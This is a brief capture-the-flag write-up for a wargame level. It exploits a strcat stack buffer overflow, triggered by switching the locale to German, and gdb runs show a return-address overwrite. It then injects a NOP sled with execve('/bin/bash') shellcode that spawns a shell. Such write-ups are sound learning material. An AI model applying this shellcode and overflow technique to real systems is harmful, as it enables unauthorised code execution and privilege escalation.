# level6

## Here we go

1. Let's switch locale to deutsch so we can actually overflow the buffer with the strcat.

```
export LANG=de
```


```
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB $(python -c 'print "CCCCDDDDCCCCDDDDCCCCDDDZZ\xef\xbe\xad\xdeYYYGGGGHHHHHIIIIJJJJ"')
Starting program: /levels/level06 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABB $(python -c 'print "CCCCDDDDCCCCDDDDCCCCDDDZZ\xef\xbe\xad\xdeYYYGGGGHHHHHIIIIJJJJ"')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCCCDDDDCCCCDDDDCCCCDDDZZﾭ�YYY

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()

```

2. Good now let's add our shellcode with a NOP sled just before.

```
(gdb) run $(python -c 'print "\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"') $(python -c 'print "CCCCDDDDCCCCDDDDCCCCDDDZZ\x14\xfb\xff\xbfYYYGGGGHHHHHIIIIJJJJ"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level06 $(python -c 'print "\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"') $(python -c 'print "CCCCDDDDCCCCDDDDCCCCDDDZZ\x14\xfb\xff\xbfYYYGGGGHHHHHIIIIJJJJ"')
Willkommen �������j
                   X�Rfh-p��Rjhh/bash/bin��RQS��̀CCCCDDDDCCCCDDDDCCCCDDDZZ���YYY
process 21744 is executing new program: /bin/bash
level6@io:/tmp/6$ exit
```

**That's it.**

See you space cowboy.

![Shimo](shimo.png) 
